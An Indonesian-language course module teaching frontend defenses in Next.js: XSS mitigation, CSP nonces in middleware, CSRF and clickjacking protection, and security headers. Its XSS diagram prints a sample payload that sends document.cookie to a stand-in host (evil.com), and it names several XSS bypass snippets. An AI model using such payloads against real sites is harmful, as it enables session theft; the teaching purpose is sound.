---
[⬅️ BAB 07 Quiz & Challenge](../BAB-07-Real-Time-WebSockets-dan-PWA-Offline/BAB-07-Quiz-dan-Challenge.md) | [📋 Silabus Induk](../README.md) | [Module 02: SSRF & Server Action Defense ➡️](./Module-02-SSRF-Server-Action-Tampering-dan-CORS-Isolation.md)
---

# Module 01: Frontend Security: XSS Mitigation, Content Security Policy (CSP Nonces), CSRF, & Clickjacking Defense

## 1. Learning Objective
Setelah menyelesaikan modul ini, peserta didik diharapkan mampu:
- Mengidentifikasi tiga varian utama **Cross-Site Scripting (XSS)**: *Stored XSS*, *Reflected XSS*, dan *DOM-based XSS*, serta bagaimana kerentanan ini mengeksploitasi fitur rendering seperti `dangerouslySetInnerHTML` di React.
- Merancang dan mengonfigurasi **Content Security Policy (CSP)** tingkat enterprise menggunakan **Cryptographic Nonces (`'nonce-<random>'`)** per request pada Next.js Edge Middleware untuk memblokir eksekusi skrip inline ilegal tanpa merusak React hydration.
- Memahami mekanisme serangan **Cross-Site Request Forgery (CSRF)** dan menguasai teknik mitigasinya: atribut cookie `SameSite=Lax/Strict`, *Double-Submit Cookie Pattern*, serta proteksi bawaan React Server Actions melalui verifikasi *Origin/Host Header*.
- Mencegah serangan **Clickjacking (UI Redressing)** menggunakan direktif CSP `frame-ancestors 'none'` dan header warisan `X-Frame-Options: DENY`.
- Mengonfigurasi bundel **HTTP Security Headers** modern: *Strict-Transport-Security (HSTS)*, *X-Content-Type-Options (nosniff)*, *Referrer-Policy*, dan *Permissions-Policy*.

---

## 2. Prerequisite
- Memahami siklus request-response HTTP dan header HTTP.
- Memahami konsep DOM (Document Object Model) dan runtime JavaScript di browser.
- Memahami prinsip Next.js Edge Middleware dan React Server Components dari Bab 03.

---

## 3. Concept
Dalam ekosistem aplikasi web full-stack, browser pengguna adalah lingkungan komputasi yang berada di luar kendali langsung developer (*Untrusted Client Environment*). Siapapun dapat menginspeksi kode, memanipulasi network traffic, atau menyuntikkan payload berbahaya.

**Cross-Site Scripting (XSS)** terjadi ketika aplikasi menyajikan data yang dimasukkan oleh pengguna ke halaman web tanpa sanitasi yang benar. Akibatnya, browser korban mengira bahwa kode JavaScript penyerang adalah bagian sah dari aplikasi Anda, lalu mengeksekusinya dengan hak akses penuh ke DOM, session storage, dan cookie non-HttpOnly.

```
[ Penyerang ] ---> Input: "<script>fetch('https://evil.com?c=' + document.cookie)</script>"
      |
      v
[ Database Aplikasi ] (Data tersimpan tanpa sanitasi)
      |
      v
[ Korban Membuka Halaman ] ---> Browser merender teks mentah sebagai HTML aktif!
💥 Skrip dieksekusi di browser korban, sesi dibajak!
```

Untuk menghentikan serangan ini, pertahanan tidak cukup hanya mengandalkan sanitasi input. Kita memerlukan pertahanan berlapis (*Defense-in-Depth*): **Content Security Policy (CSP)** bertindak sebagai polisi internal di browser yang secara tegas melarang eksekusi skrip apapun kecuali skrip tersebut memiliki **tanda pengenal unik kriptografis (Nonce)** yang diterbitkan oleh server untuk request tersebut.

---

## 4. Why? (Mengapa Membutuhkan CSP Nonces & Strict Headers?)
1. **Sanitasi Saja Selalu Memiliki Celah**: Parser HTML sangat kompleks. Penyerang selalu menemukan cara bypass baru (seperti `<svg onload=...>`, `<img src=x onerror=...>`, atau mXSS). CSP memastikan bahwa sekalipun tag HTML berbahaya lolos ke DOM, **browser menolak mengeksekusi JavaScript-nya**.
2. **Kebutuhan React Hydration & Next.js Script**: Next.js membutuhkan skrip inline untuk menghidrasi state awal. Jika CSP menggunakan aturan kuno `'unsafe-inline'`, seluruh perlindungan XSS runtuh. Dengan **CSP Nonce**, server membuat token acak unik (misal: `nonce-8f8a9d1...`) di Edge Middleware, menempelkannya pada header CSP, dan menyematkannya pada tag `<script nonce="...">` yang sah.
3. **Mencegah Penipuan Visual (Clickjacking)**: Penyerang dapat membuat situs judi atau undian palsu lalu membungkus situs perbankan Anda di dalam tag `<iframe>` transparan yang tidak terlihat. Saat korban mengira mereka mengklik tombol "Klaim Hadiah", mereka sebenarnya mengklik tombol "Transfer Semua Uang" di dalam iframe! Header `frame-ancestors 'none'` mematikan serangan ini total.

---

## 5. What? (Anatomi Header Keamanan Defensif)

### A. Content Security Policy (CSP) Directives
- `default-src 'self'`: Secara default hanya izinkan aset dari domain yang sama.
- `script-src 'self' 'nonce-<random>' 'strict-dynamic'`: Hanya izinkan skrip yang memiliki nonce yang cocok.
- `style-src 'self' 'unsafe-inline'`: Batasi sumber stylesheet.
- `img-src 'self' data: https:`: Batasi domain gambar yang boleh dimuat.
- `object-src 'none'`: Larang plugin lawas Flash atau Java applets.
- `base-uri 'self'`: Mencegah penyerang memanipulasi tag `<base href="...">` untuk membelokkan URL relatif.
- `frame-ancestors 'none'`: Larang situs lain menyematkan situs Anda ke dalam `<iframe>`.

### B. Security Headers Pendamping
- **Strict-Transport-Security (HSTS)**: `max-age=63072000; includeSubDomains; preload` (Memaksa browser hanya menggunakan HTTPS selama 2 tahun).
- **X-Content-Type-Options**: `nosniff` (Mencegah browser menebak-nebak tipe MIME yang dapat mengeksekusi file gambar sebagai skrip).
- **Referrer-Policy**: `strict-origin-when-cross-origin` (Mencegah bocornya query parameter sensitif pada URL saat pengguna menavigasi ke domain luar).

---

## 6. How? (Implementasi Dynamic CSP Nonce di Next.js Middleware)

### 1. Edge Middleware Generator Nonce (middleware.ts)
```typescript
import { NextRequest, NextResponse } from "next/server";

export function middleware(request: NextRequest) {
  // 1. Generate Nonce Kriptografis Unik per HTTP Request (16 bytes random base64)
  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");

  // 2. Susun Kebijakan Content Security Policy
  const cspHeader = `
    default-src 'self';
    script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
    style-src 'self' 'nonce-${nonce}';
    img-src 'self' blob: data: https://images.unsplash.com;
    font-src 'self';
    object-src 'none';
    base-uri 'self';
    form-action 'self';
    frame-ancestors 'none';
    upgrade-insecure-requests;
  `.replace(/\s{2,}/g, " ").trim();

  // 3. Teruskan nonce ke komponen hilir melalui request headers
  const requestHeaders = new Headers(request.headers);
  requestHeaders.set("x-nonce", nonce);
  requestHeaders.set("Content-Security-Policy", cspHeader);

  // 4. Set Header Keamanan pada Respon HTTP
  const response = NextResponse.next({
    request: {
      headers: requestHeaders,
    },
  });

  response.headers.set("Content-Security-Policy", cspHeader);
  response.headers.set("X-Frame-Options", "DENY");
  response.headers.set("X-Content-Type-Options", "nosniff");
  response.headers.set("Referrer-Policy", "strict-origin-when-cross-origin");
  response.headers.set("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload");
  response.headers.set("Permissions-Policy", "camera=(), microphone=(), geolocation=()");

  return response;
}

export const config = {
  matcher: [
    {
      source: "/((?!api|_next/static|_next/image|favicon.ico).*)",
      missing: [
        { type: "header", key: "next-router-prefetch" },
        { type: "header", key: "purpose", value: "prefetch" },
      ],
    },
  ],
};
```

### 2. Membaca Nonce di Root Layout (app/layout.tsx)
```typescript
import { headers } from "next/headers";
import Script from "next/script";

export default function RootLayout({ children }: { children: React.ReactNode }) {
  // Ambil nonce unik yang diteruskan oleh middleware
  const nonce = headers().get("x-nonce") || undefined;

  return (
    <html lang="id">
      <head>
        {/* Next.js secara otomatis menyematkan nonce ke seluruh inline script hidrasi */}
      </head>
      <body>
        {children}
        {/* Skrip analitik eksternal wajib diberi properti nonce! */}
        <Script
          src="https://analytics.perusahaan.com/tracker.js"
          strategy="afterInteractive"
          nonce={nonce}
        />
      </body>
    </html>
  );
}
```

---

## 7. Analogy
Bayangkan sebuah pesta dansa topeng istana kerajaan:
- **Web Tanpa CSP**: Penjaga gerbang membiarkan siapapun yang memakai topeng masuk (*eksekusi skrip bebas*). Seorang pembunuh bayaran menyelinap memakai jubah badut (*injeksi XSS*) dan meracuni minuman tamu.
- **CSP Nonce**: Raja mengumumkan kata sandi rahasia yang diganti setiap detik (*Cryptographic Nonce*). Setiap pelayan dan pemain musik resmi istana dibisikkan kata sandi ini di gerbang. Jika seseorang mencoba naik ke atas panggung untuk bernyanyi (*menjalankan skrip inline*) tetapi tidak memiliki cap stempel kata sandi detik itu, para pengawal kerajaan (*browser security engine*) langsung menangkap dan mengusirnya seketika!

---

## 8. Diagram Mekanisme Pertahanan CSP Nonce

```
[ Request: GET /dashboard ]
             |
             v
+--------------------------------------------------------+
| NEXT.JS EDGE MIDDLEWARE                                |
|                                                        |
| 1. Generate Nonce: `a9f4c3...`                         |
| 2. Set Header: Content-Security-Policy:                |
|    script-src 'self' 'nonce-a9f4c3...'                 |
+--------------------------------------------------------+
             |
             v (HTML Response)
+-------------------------------------------------------------------+
| BROWSER RENDERING ENGINE                                          |
|                                                                   |
| [ Skrip Resmi Next.js: <script nonce="a9f4c3..."> ]               |
|   -> Nonce COCOK! ✅ Skrip Diizinkan Berjalan                     |
|                                                                   |
| [ Payload Penyerang: <script>alert(document.cookie)</script> ]    |
|   -> TIDAK ADA NONCE! ❌                                          |
|   -> 🛡️ Browser memblokir eksekusi:                              |
|      "Refused to execute inline script because it violates CSP"   |
+-------------------------------------------------------------------+
```

---

## 9. Simple Example: Mitigasi DOM XSS di React
React secara bawaan meng-escape seluruh string yang di-render di dalam JSX:

```tsx
// AMAN SECARA BAWAAN: React mengubah `<script>` menjadi `&lt;script&gt;`
function UserComment({ text }: { text: string }) {
  return <div>{text}</div>;
}

// ⚠️ BERBAHAYA: Membuka celah DOM XSS!
function UnsafeComment({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// SOLUSI AMAN: Sanitasi menggunakan DOMPurify sebelum di-render
import DOMPurify from "isomorphic-dompurify";

function SafeRichText({ html }: { html: string }) {
  const cleanHtml = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p"],
    ALLOWED_ATTR: ["href", "target"],
  });

  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}
```

---

## 10. Practical Example: Proteksi CSRF pada React Server Actions
React Server Actions di Next.js App Router memiliki **proteksi CSRF bawaan** secara otomatis:
1. Saat Server Action dipanggil via form atau RPC POST, browser mengirimkan header `Origin` dan `Host`.
2. Next.js memeriksa apakah `Origin` cocok secara persis dengan `Host` domain aplikasi.
3. Jika permintaan POST berasal dari situs lain (misalnya `https://evil-hacker.com`), Next.js **langsung menolak request dengan status 403 Forbidden** sebelum Server Action sempat dieksekusi.

---

## 11. Real-World Example: Financial Transfer Clickjacking Defense
Sebuah fintech menerapkan aturan ketat agar halaman transfer uang tidak dapat disematkan di situs pihak ketiga:

```typescript
// next.config.mjs
const nextConfig = {
  async headers() {
    return [
      {
        source: "/transfers/:path*",
        headers: [
          {
            key: "X-Frame-Options",
            value: "DENY",
          },
          {
            key: "Content-Security-Policy",
            value: "frame-ancestors 'none';",
          },
        ],
      },
    ];
  },
};
export default nextConfig;
```
Bahkan jika penyerang membuat iframe dengan CSS opacity 0 di situs judi, browser akan menampilkan kotak abu-abu bertuliskan *"Transfer Page refused to connect"* dan membatalkan serangan clickjacking.

---

## 12. Trade-offs: Strict CSP Nonces vs 'unsafe-inline'

| Kriteria | Strict CSP Nonce | Longgar ('unsafe-inline') |
| :--- | :--- | :--- |
| **Tingkat Keamanan XSS** | **Mendekati 100% Kebal** | Sangat Rendah (XSS bebas berjalan) |
| **Kompatibilitas SSR / Hydration** | Membutuhkan plumbing middleware | Sangat mudah (tanpa setup) |
| **Skrip Pihak Ketiga (Google Tag Manager)** | Membutuhkan penerusan nonce | Otomatis berjalan |
| **Static HTML Caching di CDN** | Tidak bisa di-cache statis murni (butuh dynamic nonce) | Bisa di-cache statis bebas di CDN |

---

## 13. When To Use Strict CSP Nonces
- Aplikasi perbankan, portal pembayaran, SaaS enterprise, dan e-commerce.
- Aplikasi yang menyimpan data pelanggan sensitif (nomor telepon, alamat, riwayat medis).
- Aplikasi yang memiliki fitur user-generated content (komentar, ulasan produk, forum).

---

## 14. When NOT To Use Strict CSP Nonces
- Website statis murni (*Static Site Generation / SSG*) tanpa backend dinamis yang di-cache di Cloudflare CDN selama berbulan-bulan (Gunakan CSP berbasis hash `'sha256-...'` alih-alih nonce).

---

## 15. Common Mistakes
1. **Menggabungkan `'nonce-...'` dengan `'unsafe-inline'`**:
   - Jika browser modern melihat ada nonce, browser akan mengabaikan `'unsafe-inline'`. Namun browser lawas mungkin akan tetap membuka celah jika konfigurasi salah.
2. **Membuat Nonce Statis yang Sama Sepanjang Waktu**:
   - Menyetel `const nonce = "tetap-123456"`. Penyerang cukup mengintip source code sekali, lalu menyisipkan `<script nonce="tetap-123456">` untuk membobol seluruh halaman! **Nonce wajib unik per setiap HTTP request!**
3. **Lupa Memasang `frame-ancestors 'none'`**:
   - Mengira `X-Frame-Options: DENY` sudah cukup. Standar CSP `frame-ancestors` lebih diutamakan oleh browser modern dan mendukung pembatasan domain spesifik.

---

## 16. Best Practices

### Must Have
- Selalu gunakan `HttpOnly: true` pada cookie session untuk mencegah pencurian token saat XSS terjadi.
- Hasilkan CSP Nonce menggunakan generator acak kriptografis (`crypto.randomUUID()` atau `crypto.randomBytes(16)`).
- Pasang header `X-Content-Type-Options: nosniff` di seluruh respon server.

### Recommended
- Gunakan `DOMPurify` jika Anda terpaksa merender HTML kaya (*rich text*) yang dimasukkan pengguna.
- Terapkan `Permissions-Policy: camera=(), microphone=(), geolocation=()` untuk mematikan akses sensor hardware jika aplikasi tidak membutuhkannya.

### Advanced
- Konfigurasikan pelaporan pelanggaran CSP menggunakan direktif `report-to` atau `report-uri /api/csp-violations` untuk mendeteksi serangan XSS yang sedang berlangsung di alam liar secara real-time.

### Avoid
- Jangan pernah menggunakan fungsi `eval()` atau `new Function()` dalam kode produksi.

---

## 17. Troubleshooting Guide

| Gejala Masalah | Kemungkinan Akar Masalah | Solusi |
| :--- | :--- | :--- |
| Konsol browser penuh dengan error: `Refused to execute inline script because it violates CSP`. | Ada skrip inline pihak ketiga (Google Analytics, Hotjar) yang belum disuntikkan atribut `nonce`. | Teruskan nonce dari middleware ke komponen skrip pihak ketiga menggunakan `<Script nonce={nonce} />`. |
| Gambar dari CDN eksternal gagal dimuat (*broken image*). | Domain CDN gambar belum didaftarkan pada direktif `img-src` di CSP. | Tambahkan URL domain gambar ke dalam direktif `img-src 'self' https://res.cloudinary.com`. |
| Server Action melempar error `Invalid Server Actions request` (Status 403). | Header `Origin` atau `Host` dibelokkan oleh reverse proxy yang tidak dikonfigurasi dengan benar. | Pastikan reverse proxy meneruskan header `Host` asli dan atur `allowedOrigins` pada `next.config.js`. |

---

## 18. Exercise
- **Easy**: Tulis konfigurasi header HTTP untuk mematikan penyematan iframe (*anti-clickjacking*) pada Express atau Next.js.
- **Medium**: Buat fungsi middleware yang memeriksa apakah request body mengandung tag `<script>` berbahaya dan membersihkannya.
- **Hard**: Rancang endpoint pelaporan CSP `/api/csp-report` yang menerima laporan pelanggaran dari browser pengguna, mem-parsing detailnya, dan mencatatnya ke sistem observabilitas jika ada anomali serangan XSS massal.

---

## 19. Challenge
Rancang arsitektur keamanan berlapis untuk platform blog komunitas: Pengguna dapat menulis postingan menggunakan Markdown kaya (termasuk gambar dan tautan). Sistem harus menjamin bahwa tidak ada tautan `javascript:alert(1)` yang dapat dieksekusi, seluruh gambar eksternal dipaksa melalui HTTPS, dan CSP Nonce diterapkan secara dinamis pada setiap halaman baca tanpa merusak performa caching Server Components.

---

## 20. Summary
- Keamanan frontend menuntut pola pikir **Defense-in-Depth**: tidak ada satu perisai tunggal yang sempurna.
- **XSS** dicegah melalui sanitasi input, escaping otomatis React, dan ditegakkan secara mutlak oleh **Content Security Policy (CSP) Nonce**.
- **CSRF** ditangkal oleh cookie `SameSite` modern dan validasi Origin bawaan React Server Actions.
- Mengombinasikan CSP Nonce, proteksi clickjacking, dan bundel security headers modern menciptakan benteng pertahanan web tingkat bank (*enterprise-grade*).

---

## Hands-on Practice: Simulasi CSP Nonce Evaluator & XSS Interceptor
Jalankan simulator generator CSP Nonce dinamis, evaluator eksekusi skrip browser, dan penangkal clickjacking mandiri:

```bash
node Full-Stack/BAB-08-Keamanan-Full-Stack-Defensif-OWASP/hands-on/m01/csp_nonce_xss_defense_sim.js
```

---
[⬅️ BAB 07 Quiz & Challenge](../BAB-07-Real-Time-WebSockets-dan-PWA-Offline/BAB-07-Quiz-dan-Challenge.md) | [📋 Silabus Induk](../README.md) | [Module 02: SSRF & Server Action Defense ➡️](./Module-02-SSRF-Server-Action-Tampering-dan-CORS-Isolation.md)
---
